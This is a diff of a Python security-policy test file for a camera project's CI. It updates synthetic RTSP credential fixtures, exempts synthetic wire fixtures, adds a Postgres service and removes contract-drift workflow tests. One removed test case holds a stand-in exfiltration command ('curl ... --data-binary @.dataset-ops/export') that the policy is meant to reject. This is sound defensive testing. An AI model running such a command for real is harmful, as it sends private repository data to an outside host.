@@ -198,9 +198,6 @@ _SYNTHETIC_RTSP_FIXTURES = {
     Path("tests/test_camera_roster_sync.py"): {
         "rtsp://user:password@camera/private",
     },
-    Path("tests/test_camera_topology_store.py"): {
-        "rtsp://operator:private@10.0.0.9/live",
-    },
     Path("tests/test_sources_rtsp.py"): {
         "rtsp://user:password@camera.local/live",
         "rtsp://user:secret@camera.local/live?token=abc",
@@ -212,12 +209,15 @@ _SYNTHETIC_RTSP_FIXTURES = {
         "rtsp://user:password@host/stream?profile=main&username=admin&secret=abc",
         "rtsp://***:***@host/stream?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
     },
-    Path("tests/test_catalog_verify.py"): {
-        "rtsp://operator:fixture-password@192.0.2.10/s",
-        "rtsp://operator:fixture-password@192.0.2.11/s",
-    },
-    Path("tests/test_clips_catalog.py"): {
-        "rtsp://operator:fixture-password@example.test/live",
+    Path("tests/test_postgres_cameras.py"): {
+        # PostgreSQL 카메라 저장소가 자격증명을 마스킹하고, 자격증명만 다른 URL 을
+        # 같은 스트림으로 식별하는지 증명하는 입력값이다. 호스트는 모두 예약
+        # 도메인(.invalid, RFC 2606)이고 자격증명은 고정 더미 값이다.
+        "rtsp://operator:synthetic-private@camera.invalid/live",
+        "rtsp://***:***@redacted-camera/live",
+        "rtsp://original:secret@camera-a.invalid/live/?a=1&b=2",
+        "RTSP://different:credentials@CAMERA-A.invalid:554/live/?b=2&a=1",
+        "RTSP://other:secret@CAMERA.invalid:554/live/",
     },
     Path("tests/test_worker_config_lifecycle.py"): {
         "rtsp://user:camera-pass@camera/live",
@@ -529,6 +529,59 @@ def _is_public_safe_contract_fixture(relative: Path, blob: bytes) -> bool:
     return metadata.get("redaction") == _CONTRACT_FIXTURE_REDACTION_NOTICE
 
 
+# Python-worker wire goldens recorded for the Rust worker port. Their wire
+# contract carries both "camera_id" and "facility_id", which trips the
+# two-identity-field heuristic below even though every value is synthetic.
+# The exemption holds only while every camera_id/facility_id value anywhere in
+# the JSON document comes from this allowlist and no resident_id/subject_id key
+# exists, so a recorded real identifier still trips the guard.
+_WORKER_WIRE_FIXTURE_ROOT = ("tests", "fixtures", "worker-wire")
+_WORKER_WIRE_SYNTHETIC_IDENTIFIERS = {
+    "camera_id": frozenset(
+        {
+            "camera-replay",
+            "camera-replay-http",
+            # Synthetic cuid from tests/test_worker_relay_payload_contract.py.
+            "cmsnw6rjc01vhlh01oswn99yq",
+        }
+    ),
+    "facility_id": frozenset({"facility-1"}),
+}
+_WORKER_WIRE_FORBIDDEN_KEYS = frozenset({"resident_id", "subject_id"})
+
+
+def _worker_wire_identifiers_are_synthetic(value: object) -> bool:
+    if isinstance(value, dict):
+        for key, child in value.items():
+            normalized = str(key).strip().lower()
+            if normalized in _WORKER_WIRE_FORBIDDEN_KEYS:
+                return False
+            allowed = _WORKER_WIRE_SYNTHETIC_IDENTIFIERS.get(normalized)
+            if allowed is not None and (not isinstance(child, str) or child not in allowed):
+                return False
+            if not _worker_wire_identifiers_are_synthetic(child):
+                return False
+        return True
+    if isinstance(value, list):
+        return all(_worker_wire_identifiers_are_synthetic(item) for item in value)
+    return True
+
+
+def _is_public_safe_worker_wire_fixture(relative: Path, blob: bytes) -> bool:
+    root_depth = len(_WORKER_WIRE_FIXTURE_ROOT)
+    if len(relative.parts) <= root_depth:
+        return False
+    if relative.parts[:root_depth] != _WORKER_WIRE_FIXTURE_ROOT:
+        return False
+    if relative.suffix != ".json":
+        return False
+    try:
+        document = json.loads(blob.decode("utf-8"))
+    except (UnicodeDecodeError, json.JSONDecodeError):
+        return False
+    return _worker_wire_identifiers_are_synthetic(document)
+
+
 def _is_public_safe_structured_fixture(relative: Path, blob: bytes) -> bool:
     if relative not in PUBLIC_SAFE_STRUCTURED_FIXTURES:
         return False
@@ -592,6 +645,7 @@ def test_tracked_tree_contains_no_data_or_private_binary_assets() -> None:
             _looks_like_sensitive_dataset(blob)
             and not _is_public_safe_structured_fixture(relative, blob)
             and not _is_public_safe_contract_fixture(relative, blob)
+            and not _is_public_safe_worker_wire_fixture(relative, blob)
         )
         if _contains_forbidden_control_bytes(blob):
             violations.append(f"{relative}:control-bytes")
@@ -945,12 +999,14 @@ _SHARD_DISCOVERY = (
 # repository, reads no secret, starts no container and re-checks out nothing, so
 # it stays admissible under this closed-world contract.
 #
-# The marker filter is byte-for-byte what it has always been. Sharding is a
-# deterministic round-robin over the sorted *tracked* test files, which is why
-# it adds no dependency to uv.lock -- pytest-split or pytest-xdist would each
-# add one, and a new PyPI dependency resolved at CI time in an untrusted
-# workflow is exactly the supply-chain surface this file exists to bound. If a
-# shard ever collects nothing the step fails loudly rather than passing empty.
+# The marker filter deselects the original three markers plus `private_bundle`
+# (CI fetches no model weights); it fails when selected without models/, so the
+# filter is the one place it is left out. Sharding is a deterministic
+# round-robin over the sorted *tracked* test files, which is why it adds no
+# dependency to uv.lock -- pytest-split or pytest-xdist would each add one, and
+# a new PyPI dependency resolved at CI time in an untrusted workflow is exactly
+# the supply-chain surface this file exists to bound. If a shard ever collects
+# nothing the step fails loudly rather than passing empty.
 _TEST_STEPS = [
     _CHECKOUT_STEP,
     _SETUP_UV_STEP,
@@ -968,8 +1024,12 @@ _TEST_STEPS = [
         # The matrix value is passed through `env:` and read back as `$SHARD`.
         # Interpolating `${{ matrix.shard }}` into the script body splices
         # expression text into the shell source before bash parses it; `$SHARD`
-        # is a value the shell reads, never source it compiles.
-        "env": {"SHARD": "${{ matrix.shard }}"},
+        # is a value the shell reads, never source it compiles. The DSN points
+        # at the job's own postgres service below and carries no credential.
+        "env": {
+            "SHARD": "${{ matrix.shard }}",
+            "SEEON_TEST_POSTGRES_DSN": "postgresql://postgres@127.0.0.1:5432/seeon_test",
+        },
         "run": _SHARD_DISCOVERY
         + (
             'if [ "${#shard_files[@]}" -eq 0 ]; then\n'
@@ -978,7 +1038,8 @@ _TEST_STEPS = [
             "fi\n"
             'echo "shard $SHARD/$SHARD_TOTAL: ${#shard_files[@]} files"\n'
             "uv run pytest -q -m "
-            '"not real_stack and not heavy and not integration" \\\n'
+            '"not real_stack and not heavy and not integration '
+            'and not private_bundle" \\\n'
             '  "${shard_files[@]}"\n'
         ),
     },
@@ -1034,6 +1095,23 @@ _EXPECTED_JOBS: dict[str, dict[str, object]] = {
             "matrix": {"shard": ["1", "2", "3", "4"]},
         },
         "env": {"SHARD_TOTAL": "4"},
+        # The only admitted service: a digest-pinned image that cannot be
+        # repointed, trust auth with no secret, published only on the job runner.
+        "services": {
+            "postgres": {
+                "image": (
+                    "postgres@sha256:"
+                    "9e73daeb439141c2b11eea2463f5f1a3b269fd90d897b41cddb7cb440f21aa5d"
+                ),
+                "env": {"POSTGRES_HOST_AUTH_METHOD": "trust", "POSTGRES_DB": "seeon_test"},
+                "command": "-c fsync=on -c synchronous_commit=on -c max_connections=200",
+                "ports": ["5432:5432"],
+                "options": (
+                    '--health-cmd "pg_isready -h 127.0.0.1 -U postgres -d seeon_test"'
+                    " --health-interval 2s --health-timeout 5s --health-retries 30"
+                ),
+            }
+        },
         "steps": _TEST_STEPS,
     },
     "ci-ok": {
@@ -2063,12 +2141,13 @@ def test_pull_request_secret_policy_allows_a_secret_behind_a_non_pr_job_gate() -
 
 
 def test_pull_request_workflow_discovery_ignores_workflows_without_the_trigger() -> None:
-    # contract-drift.yml reads a private repository with a secret, and is safe
-    # precisely because `pull_request` cannot start it. It must stay outside the
-    # discovered set, or the rules above would be asserting the wrong thing.
-    assert "contract-drift.yml" in _tracked_workflows()
-    assert "contract-drift.yml" not in _pull_request_workflows()
-    assert "pull_request" not in _trigger_names(_workflow("contract-drift.yml"))
+    # release.yml grants `contents: write` and `actions: write` to the job that
+    # creates the GitHub Release, and is safe precisely because `pull_request`
+    # cannot start it. It must stay outside the discovered set, or the rules
+    # above would be asserting the wrong thing.
+    assert "release.yml" in _tracked_workflows()
+    assert "release.yml" not in _pull_request_workflows()
+    assert "pull_request" not in _trigger_names(_workflow("release.yml"))
 
 
 # ---------------------------------------------------------------------------
@@ -2184,7 +2263,7 @@ def test_shard_discovery_in_ci_matches_the_partition_modelled_here() -> None:
     assert "LC_ALL=C sort" in _SHARD_DISCOVERY
     assert "'NR % total == shard % total'" in _SHARD_DISCOVERY
     # And the matrix value reaches the script as data, never as spliced source.
-    assert step["env"] == {"SHARD": "${{ matrix.shard }}"}
+    assert step["env"]["SHARD"] == "${{ matrix.shard }}"
     assert "${{ matrix.shard }}" not in run
 
 
@@ -2293,157 +2372,3 @@ def test_round_robin_matches_the_awk_indexing() -> None:
     assert partition[2] == ["tests/test_2.py", "tests/test_6.py"]
     assert partition[3] == ["tests/test_3.py", "tests/test_7.py"]
     assert partition[4] == ["tests/test_4.py", "tests/test_8.py"]
-
-
-def _assert_trusted_contract_drift_security(workflow: dict[str, object]) -> None:
-    assert set(workflow) == {"jobs", "name", "on", "permissions"}
-    events = workflow["on"]
-    assert events == {
-        "push": {
-            "branches": ["main"],
-            "paths": [
-                "contracts/**",
-                "tests/test_vendor_drift.py",
-                ".github/workflows/contract-drift.yml",
-            ],
-        }
-    }
-    assert workflow["permissions"] == {"contents": "read"}
-
-    jobs = workflow["jobs"]
-    assert isinstance(jobs, dict)
-    assert set(jobs) == {"verify"}
-    verify = jobs["verify"]
-    assert isinstance(verify, dict)
-    assert set(verify) == {"env", "runs-on", "steps"}
-    assert verify["runs-on"] == "ubuntu-latest"
-    assert verify["env"] == {
-        "DATASET_OPS_REQUIRED": "1",
-        "DATASET_OPS_REPO": "${{ github.workspace }}/.dataset-ops",
-    }
-    steps = verify["steps"]
-    assert isinstance(steps, list)
-    assert steps == [
-        {
-            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
-            "with": {"persist-credentials": "false"},
-        },
-        {
-            "uses": "astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
-            "with": {"enable-cache": "false", "version": "0.11.27"},
-        },
-        {"run": "uv sync --frozen"},
-        {
-            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
-            "with": {
-                "repository": "SeniorAILab/eldercare-dataset-ops",
-                "path": ".dataset-ops",
-                "token": "${{ secrets.DATASET_OPS_TOKEN }}",
-                "persist-credentials": "false",
-                "fetch-depth": "1",
-                "sparse-checkout": "ml/contracts\n",
-                "sparse-checkout-cone-mode": "false",
-            },
-        },
-        {
-            "name": "Verify vendored contracts",
-            "shell": "bash",
-            "run": (
-                "set +e\n"
-                'uv run pytest -q tests/test_vendor_drift.py > "$RUNNER_TEMP/'
-                'contract-drift.log" 2>&1\n'
-                "status=$?\n"
-                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
-                "if (( status != 0 )); then\n"
-                '  echo "::error::Vendored contract drift verification failed; '
-                'details suppressed."\n'
-                '  exit "$status"\n'
-                "fi\n"
-            ),
-        },
-        {
-            "name": "Remove private checkout",
-            "if": "always()",
-            "shell": "bash",
-            "run": (
-                'rm -rf -- "${{ github.workspace }}/.dataset-ops"\n'
-                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
-            ),
-        },
-    ]
-
-
-def test_trusted_contract_drift_workflow_is_non_persistent() -> None:
-    workflow = _workflow("contract-drift.yml")
-    _assert_trusted_contract_drift_security(workflow)
-
-    serialized = yaml.safe_dump(workflow)
-    assert "upload-artifact" not in serialized
-    assert "actions/cache" not in serialized
-
-
-@pytest.mark.parametrize(
-    ("step_index", "field", "value"),
-    [
-        (0, "uses", "actions/checkout@v4"),
-        (1, "uses", "astral-sh/setup-uv@v5"),
-        (4, "run", "curl https://example.invalid --data-binary @.dataset-ops/export"),
-        (5, "if", "success()"),
-    ],
-)
-def test_trusted_contract_policy_rejects_security_mutations(
-    step_index: int, field: str, value: str
-) -> None:
-    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
-    jobs = workflow["jobs"]
-    assert isinstance(jobs, dict)
-    job = jobs["verify"]
-    assert isinstance(job, dict)
-    steps = job["steps"]
-    assert isinstance(steps, list)
-    steps[step_index][field] = value
-
-    with pytest.raises(AssertionError):
-        _assert_trusted_contract_drift_security(workflow)
-
-
-@pytest.mark.parametrize(
-    ("field", "value"),
-    [
-        ("continue-on-error", "true"),
-        ("if", "false"),
-        ("runs-on", "self-hosted"),
-        ("container", "unreviewed/image:latest"),
-    ],
-)
-def test_trusted_contract_policy_rejects_job_mutations(field: str, value: object) -> None:
-    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
-    jobs = workflow["jobs"]
-    assert isinstance(jobs, dict)
-    job = jobs["verify"]
-    assert isinstance(job, dict)
-    job[field] = value
-
-    with pytest.raises(AssertionError):
-        _assert_trusted_contract_drift_security(workflow)
-
-
-@pytest.mark.parametrize(
-    ("field", "value"),
-    [
-        ("DATASET_OPS_REQUIRED", "0"),
-        ("DATASET_OPS_REPO", "/tmp/redirected"),
-    ],
-)
-def test_trusted_contract_policy_rejects_environment_mutations(field: str, value: str) -> None:
-    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
-    jobs = workflow["jobs"]
-    assert isinstance(jobs, dict)
-    job = jobs["verify"]
-    assert isinstance(job, dict)
-    environment = job["env"]
-    assert isinstance(environment, dict)
-    environment[field] = value
-
-    with pytest.raises(AssertionError):
-        _assert_trusted_contract_drift_security(workflow)
